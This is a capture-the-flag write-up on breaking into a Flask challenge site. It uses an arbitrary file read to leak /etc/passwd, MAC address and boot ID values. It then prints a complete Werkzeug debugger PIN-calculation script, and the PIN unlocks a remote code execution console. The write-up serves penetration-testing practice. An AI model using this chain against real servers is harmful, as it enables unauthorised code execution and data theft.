![image](https://github.com/user-attachments/assets/241d061b-948f-480e-bed9-13377513643b)

# Exploration
We've been given a website that could able to view source code

![image](https://github.com/user-attachments/assets/0a62ce9c-47cc-4b4f-90c0-c5c46fa7ff2f)

let's try some normal files like the ones, exist in the website
![image](https://github.com/user-attachments/assets/e2d6017e-e371-409b-a0be-12cfeff4bf7c)

Alright, it shows some website files

Let's try some more explicit files.
![image](https://github.com/user-attachments/assets/74b40fe3-a139-4328-a81a-9d852b86e49b)

Aha, interesting.

Let's try abnormal payload.
![image](https://github.com/user-attachments/assets/8791c99b-cad4-4619-a9d2-3049caaf58ec)
![image](https://github.com/user-attachments/assets/8e9f80b8-a834-4b58-8fb6-31f2d12463e0)

This gives us plenty of information about the website. It's running on a Flask environment.

The error code also shows that there is a WSGI debugger running.

We can access it's console to run some shell commands.

![image](https://github.com/user-attachments/assets/a322bcfd-2b97-4af7-8940-1803962f3eba)

Great!, We just need a PIN. Since we can access some sensitive folder as shown above, we can easily leak data that could calculate the PIN.

# Solution
Refer to this website for more step by step details of the exploitation.

https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/werkzeug

We need a total of 6 information
1. username
2. modname
3. app name
4. Full path of flask package
5. UUID
6. machine id

**Username**

We can get through /etc/password, therefore it's "very_secure_username"
![image](https://github.com/user-attachments/assets/74b40fe3-a139-4328-a81a-9d852b86e49b)

**Modname**

Typically is "flask.app"

**app name**

We can find this in main.py, it's "Flask".
![Screenshot 2024-12-01 165902](https://github.com/user-attachments/assets/d5b8858e-dd4e-49ab-b4c2-975fe1fb4e35)

**Full path of flask package**

The 500 internal server error gave info on that.
![Screenshot 2024-12-01 165902](https://github.com/user-attachments/assets/5714c664-153a-47d1-892b-d5ab802673f6)

**UUID**

First, check /proc/net/arp to get device ID.
![image](https://github.com/user-attachments/assets/e83b4861-e52d-4f43-bfd6-e58ddbf9758b)

Then we get UUID with this filepath, /sys/class/net/<device id>/address
![image](https://github.com/user-attachments/assets/40ecfff3-361c-447a-96a1-d66cbf3b6378)

We need to convert it into decimal strings too.
![image](https://github.com/user-attachments/assets/be7b464b-79b2-41ff-8a31-b5cd0864bc3e)

**machine id**

Get from this file, /proc/sys/kernel/random/boot_id
![image](https://github.com/user-attachments/assets/4d788847-62dd-40ab-8cde-18fb09137dc2)



Nice, after getting all information, we can calculating the PIN.

The website has already given a python code to do it. We just need to input all values into it

```
import hashlib
from itertools import chain
probably_public_bits = [
    'very_secure_username',  # username
    'flask.app',  # modname
    'Flask',  # app name
    '/usr/local/lib/python3.11/site-packages/flask/app.py'  # flask packages full path
]

private_bits = [
    '257961218066324',  # UUID
    '90eca5f1-105b-434e-ad02-135111eb1526'  # machine id
]

#h = hashlib.md5()  # Changed in https://werkzeug.palletsprojects.com/en/2.2.x/changes/#version-2-0-0
h = hashlib.sha1()
for bit in chain(probably_public_bits, private_bits):
    if not bit:
        continue
    if isinstance(bit, str):
        bit = bit.encode('utf-8')
    h.update(bit)
h.update(b'cookiesalt')
#h.update(b'shittysalt')

cookie_name = '__wzd' + h.hexdigest()[:20]

num = None
if num is None:
    h.update(b'pinsalt')
    num = ('%09d' % int(h.hexdigest(), 16))[:9]

rv = None
if rv is None:
    for group_size in 5, 4, 3:
        if len(num) % group_size == 0:
            rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')
                          for x in range(0, len(num), group_size))
            break
    else:
        rv = num

print(rv)
```

![image](https://github.com/user-attachments/assets/0665b09d-caec-4ac3-bd12-c9c590401f0b)

Now, just enter the PIN.

![image](https://github.com/user-attachments/assets/026ed994-412a-4fd9-8e6a-18e64365d8fc)
![image](https://github.com/user-attachments/assets/cb783a0a-6efa-4ff5-b96c-80cc5720a030)

TA_DA, we're in.

Now, just write python code to get flag.

![image](https://github.com/user-attachments/assets/c4af1f58-7850-4c88-9042-a2841359e0ec)

BINGO, that's it for this challenge.

In my opinion, this challenge is good for those for want deeper understanding of peneration testing.



